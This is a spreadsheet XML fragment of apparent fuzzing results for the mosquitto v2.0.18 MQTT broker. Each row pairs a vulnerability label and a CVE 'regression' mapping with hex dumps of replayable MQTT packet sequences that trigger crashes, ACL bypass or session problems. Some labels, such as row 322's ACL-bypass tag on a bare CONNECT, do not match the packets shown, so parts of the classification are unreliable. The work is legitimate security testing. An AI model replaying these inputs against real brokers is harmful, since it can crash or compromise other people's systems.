      <c r="C314" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(255B)\u000a4.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314" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:03c5 ===\u000a大小: 1658B (报告+请求数据)\u000a请求数据: 255B\u000a\u000a---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CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=14s Will=YES [持久会话] | raw_header=101500044d51545404e4000e00002c01\u000aMsg[2]: PINGRESP  | raw_header=d700\u000aMsg[3]: SUBSCRIBE PacketID=1 Topics=['User=\x86'(QoS=1)] | raw_header=820b00010006557365723d8675\u000aMsg[4]: SUBSCRIBE PacketID=1058 Topics=[''(零长度!QoS=1)] | raw_header=822e0422000001740a000d2473686172\u000aMsg[5]: PUBLISH Topic='$share/grp1/test/+' QoS=1 retain=True payload_len=146B | raw_header=33a60100122473686172652f67727031</f>
        <v/>
      </c>
      <c r="F3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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J31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1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15">
      <c r="A315" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B315" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C315" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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15" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0002 ===\u000a大小: 394B (报告+请求数据)\u000a请求数据: 70B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(70B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=255 Topics=[] | raw_header=820b00ffffff7f13f502053c00\u000aMsg[2]: SUBSCRIBE PacketID=46 Topics=['test/topic'(QoS=2)] | raw_header=820f002e000a746573742f746f706963\u000aMsg[3]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=False payload='\x00/\x1b\u0009±' | raw_header=3c24001d245359532f62726f6b65722f\u000aMsg[4]: (不完整,2B) raw=087f\u000a(尾部2B): 087f</f>
        <v/>
      </c>
      <c r="F3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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J31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16">
      <c r="A316" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:3,cat:000a</t>
        </is>
      </c>
      <c r="B316" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C316" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(123B)\u000a4.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16" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:000a ===\u000a大小: 1784B (报告+请求数据)\u000a请求数据: 123B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: $SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b CVE=N/A)\u000a\u000a--- MQTT请求序列(123B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=8976 Topics=[] | raw_header=812f2310ff7f014d000254057f006b3b\u000aMsg[2]: CONNACK  | raw_header=2200\u000aMsg[3]: (不完整,72B) raw=1173656e736f722f74656d702f726f6f6d3100117b2274656d70223a32322e357d3515000d686f6d\u000a(尾部72B): 1173656e736f722f74656d702f726f6f6d3100117b2274656d70223a32322e357d3515000d686f6d652f2b2f737461747070</f>
        <v/>
      </c>
      <c r="F3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1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16" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J31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1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17">
      <c r="A317" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B317" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C317" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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17" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0082 ===\u000a大小: 622B (报告+请求数据)\u000a请求数据: 110B\u000a\u000a---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MQTT请求序列(110B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=29 Topics=['test/topic'(QoS=0), '$share/g3/home/+/temperature'(QoS=0)] | raw_header=822e001d000a746573742f746f706963\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=True payload='\x00\x1eXxøÍ\x0e\x8a!6²*õùëjÝ\x886\x1eM\x91' | raw_header=332b0013245359532f62726f6b65722f\u000aMsg[3]: SUBSCRIBE PacketID=1 Topics=['\x00\x00\x00 /#'(QoS=0)] | raw_header=820b00010006000000202f2340\u000aMsg[4]: CONNACK  | raw_header=2e00\u000aMsg[5]: (不完整,2B) raw=27ed\u000a(尾部2B): 27ed</f>
        <v/>
      </c>
      <c r="F3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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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18">
      <c r="A318" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B318" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C318" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(285B)\u000a4.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18" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:00c0 ===\u000a大小: 655B (报告+请求数据)\u000a请求数据: 285B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Excessive v5 user-properties (CPU exhaustion risk) (Cat=0x00c0 Hash=0xa8bb2df4 CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(285B原始二进制) ---\u000aMsg[1]: (不完整,285B) raw=cdcdcdb3cdcdcde4cdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdbd\u000a(尾部285B): cdcdcdb3cdcdcde4cdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdbdcdcdcdcdcd701bb5eb91</f>
        <v/>
      </c>
      <c r="F3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1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18" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J31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318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19">
      <c r="A319" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:3,cat:00c2</t>
        </is>
      </c>
      <c r="B319" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C319" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(762B)\u000a4.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0x00c2\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E319" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:00c2 ===\u000a大小: 1948B (报告+请求数据)\u000a请求数据: 762B\u000a\u000a---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MQTT请求序列(762B原始二进制) ---\u000aMsg[1]: PUBREC PacketID=20003 | raw_header=50494e23301326262626262626262626\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[3]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[4]: CONNECT  | raw_header=1000\u000aMsg[5]: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(不完整,445B) raw=33820b00010006746573742f2302340e0006746573742f6300262626262626262626262626262626\u000a(尾部445B): 33820b00010006746573742f2302340e0006746573742f630026262626262626262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F3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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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1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0">
      <c r="A320" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B320" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C320" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(364B)\u000a4.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20" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0101 ===\u000a大小: 891B (报告+请求数据)\u000a请求数据: 364B\u000a\u000a---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MQTT请求序列(364B原始二进制) ---\u000aMsg[1]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1067827bff6f0080ffffff666c6e6574\u000aMsg[2]: (不完整,259B) raw=0befef9f5403000a746573742f746f706963d43cd7b498aa801f31183f084f8e1a218bb29edbfc10\u000a(尾部259B): 0befef9f5403000a746573742f746f706963d43cd7b498aa801f31183f084f8e1a218bb29edbfc10894b42e63a0156e6ef2a</f>
        <v/>
      </c>
      <c r="F3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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J3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2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21">
      <c r="A321" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:3,cat:0181</t>
        </is>
      </c>
      <c r="B321" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C321" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(894B)\u000a4.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21" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0181 ===\u000a大小: 1608B (报告+请求数据)\u000a请求数据: 894B\u000a\u000a---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MQTT请求序列(894B原始二进制) ---\u000aMsg[1]: CONNACK session_present=101 reason_code=64 | raw_header=241365405f6310820b00007fff657432\u000aMsg[2]: TYPE0  | raw_header=0000\u000aMsg[3]: TYPE0  | raw_header=0000\u000aMsg[4]: TYPE0  | raw_header=0000\u000aMsg[5]: TYPE0  | raw_header=0000\u000aMsg[6]: PUBLISH  | raw_header=3900\u000aMsg[7]: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raw_header=0000\u000a(尾部825B): 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</f>
        <v/>
      </c>
      <c r="F3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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J32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2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22">
      <c r="A322" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:3,cat:0182</t>
        </is>
      </c>
      <c r="B322" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C322" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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0x0182\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E322" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0182 ===\u000a大小: 1162B (报告+请求数据)\u000a请求数据: 16B\u000a\u000a---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CVE=N/A)\u000a\u000a--- MQTT请求序列(16B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=38s [自动清理会话] | raw_header=100c00044d515454040200260000\u000aMsg[2]: (不完整,2B) raw=0002\u000a(尾部2B): 0002</f>
        <v/>
      </c>
      <c r="F3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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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3">
      <c r="A323" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:3,cat:0183</t>
        </is>
      </c>
      <c r="B323" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C323" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(2565B)\u000a4.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23" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0183 ===\u000a大小: 3757B (报告+请求数据)\u000a请求数据: 2565B\u000a\u000a---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MQTT请求序列(2565B原始二进制) ---\u000aMsg[1]: PUBREC PacketID=4100 | raw_header=503110044d6400532af9000000000000\u000aMsg[2]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=10220000000000000000000000000000\u000aMsg[3]: CONNECT  | raw_header=1000\u000aMsg[4]: PUBREL PacketID=29743 | raw_header=6273742f2300b3eb00934d5f0b000100\u000aMsg[5]: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DISCONNECT 断开连接 | raw_header=e500\u000aMsg[22]: TYPE0  | raw_header=0000\u000aMsg[23]: TYPE0  | raw_header=0000\u000aMsg[24]: TYPE0  | raw_header=0000\u000aMsg[25]: TYPE0  | raw_header=0000\u000a(尾部2317B): 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080ffff00</f>
        <v/>
      </c>
      <c r="F3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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J32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4">
      <c r="A324" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B324" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C324" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(14893B)\u000a4.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0x0206\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E324" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0206 ===\u000a大小: 6243B (报告+请求数据)\u000a请求数据: 14893B\u000a\u000a---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MQTT请求序列(14893B原始二进制) ---\u000aMsg[1]: CONNACK session_present=48 reason_code=48 | raw_header=232b303052ffff03e830300430303030\u000aMsg[2]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[3]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[4]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[5]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[6]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[7]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[8]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[9]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[10]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[11]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[12]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[13]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[14]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[15]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[16]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[17]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[18]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[19]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[20]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[21]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[22]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[23]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[24]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[25]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000a(尾部2904B): 3030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030</f>
        <v/>
      </c>
      <c r="F3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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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5">
      <c r="A325" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B325" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C325" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(157B)\u000a4.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0x0286\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E325" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0286 ===\u000a大小: 1274B (报告+请求数据)\u000a请求数据: 157B\u000a\u000a---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MQTT请求序列(157B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0100\u000aMsg[2]: AUTH  | raw_header=f10101\u000aMsg[3]: TYPE0  | raw_header=0101fe\u000aMsg[4]: PUBLISH  | raw_header=3f0101\u000aMsg[5]: TYPE0  | raw_header=010101\u000aMsg[6]: TYPE0  | raw_header=010101\u000aMsg[7]: TYPE0  | raw_header=010101\u000aMsg[8]: TYPE0  | raw_header=00800101010e00002c0163e400f2011a\u000aMsg[9]: TYPE0  | raw_header=0000\u000aMsg[10]: CONNACK  | raw_header=2c0163\u000aMsg[11]: CONNACK  | raw_header=20</f>
        <v/>
      </c>
      <c r="F3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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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6">
      <c r="A326" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:3,cat:02c4</t>
        </is>
      </c>
      <c r="B326" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C326" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(2288B)\u000a4.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326" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:02c4 ===\u000a大小: 3028B (报告+请求数据)\u000a请求数据: 2288B\u000a\u000a---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MQTT请求序列(2288B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0c0c0c0c0c240c0c0e0c0c260c19\u000aMsg[2]: TYPE0  | raw_header=0c0c0c0c0c0ca00c0c0c26262626\u000aMsg[3]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[4]: PUBREL PacketID=28527 | raw_header=6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f\u000aMsg[5]: PUBREL PacketID=28527 | raw_header=6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f\u000aMsg[6]: (不完整,1994B) raw=6fff6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f\u000a(尾部1994B): 6fff6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f</f>
        <v/>
      </c>
      <c r="F3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2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26" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J32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32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27">
      <c r="A327" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:3,cat:02c6</t>
        </is>
      </c>
      <c r="B327" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C327" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(2010B)\u000a4.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327" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:02c6 ===\u000a大小: 3131B (报告+请求数据)\u000a请求数据: 2010B\u000a\u000a---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MQTT请求序列(2010B原始二进制) ---\u000aMsg[1]: (不完整,2010B) raw=ffff101f00880bdda497979720970000000000000000000000000000000000000000000000000000\u000a(尾部2010B): ffff101f00880bdda49797972097000000000000000000000000000000000000000000000000000000000000000000000000</f>
        <v/>
      </c>
      <c r="F3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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J32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28">
      <c r="A328" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:3,cat:0305</t>
        </is>
      </c>
      <c r="B328" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C328" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D3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328" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0305 ===\u000a大小: 785B (报告+请求数据)\u000a请求数据: 96B\u000a\u000a---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MQTT请求序列(96B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=11 Topics=['very/deep/topic/level1/level2/level3/level4'(QoS=2)] | raw_header=8230000b002b766572792f646565702f\u000aMsg[2]: PUBLISH Topic='sensor/temp' QoS=1 retain=False payload='\x00\x0c¡$x(=ªÛ,ä\x18\x07¶¯|Ûb\x96××îÆûÁ¡\x8dÜ\x92' | raw_header=3a2a000b73656e736f722f74656d7000\u000aMsg[3]: (不完整,2B) raw=ff82\u000a(尾部2B): ff82</f>
        <v/>
      </c>
      <c r="F3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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J32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2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29">
      <c r="A329" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:3,cat:0386</t>
        </is>
      </c>
      <c r="B329" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C329" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(36B)\u000a4.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329" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0386 ===\u000a大小: 1117B (报告+请求数据)\u000a请求数据: 36B\u000a\u000a---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CVE=N/A)\u000a【Sev2】MQTT: Duplicate packet identifier (replay/session hijack) (Cat=0x0204 Hash=0xcc642ed8 CVE=N/A)\u000a【Sev2】MQTT: Duplicate packet identifier (replay/session hijack) (Cat=0x0204 Hash=0xcc642ed8 CVE=N/A)\u000a\u000a--- MQTT请求序列(36B原始二进制) ---\u000aMsg[1]: CONNECT  | raw_header=1000\u000aMsg[2]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=14s Will=YES [自动清理会话] | raw_header=101500044d515454040e000e00002c01\u000aMsg[3]: TYPE0  | raw_header=0a00\u000aMsg[4]: DISCONNECT 断开连接 | raw_header=e2066e0082200001\u000aMsg[5]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F3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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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2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0">
      <c r="A330" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:3,cat:0387</t>
        </is>
      </c>
      <c r="B330" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C330" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(32B)\u000a4.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0x0387\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E330" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0387 ===\u000a大小: 1310B (报告+请求数据)\u000a请求数据: 32B\u000a\u000a---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MQTT请求序列(32B原始二进制) ---\u000aMsg[1]: AUTH  | raw_header=fa00\u000aMsg[2]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=14s Will=YES [持久会话] | raw_header=101500044d51545404e4000e00002c01\u000aMsg[3]: (不完整,7B) raw=1015ff80000100\u000a(尾部7B): 1015ff80000100</f>
        <v/>
      </c>
      <c r="F3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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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1">
      <c r="A331" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B331" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C331" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(241B)\u000a4.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31" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0040 ===\u000a大小: 618B (报告+请求数据)\u000a请求数据: 241B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(241B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=59298 Topics=['te\x05\x02\x00&lt;'(QoS=0), ''(零长度!QoS=2)] | raw_header=8220e7a2000674650502003c2800000e\u000aMsg[2]: PUBREL PacketID=46403 | raw_header=6675b54365725f7b796e630005054a00\u000aMsg[3]: PINGRESP  | raw_header=d1414141414141414141414141414141\u000aMsg[4]: (不完整,21B) raw=7dc041e010000e11000000001f00066e6f726d616c\u000a(尾部21B): 7dc041e010000e11000000001f00066e6f726d616c</f>
        <v/>
      </c>
      <c r="F3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1" s="2" t="inlineStr">
        <is>
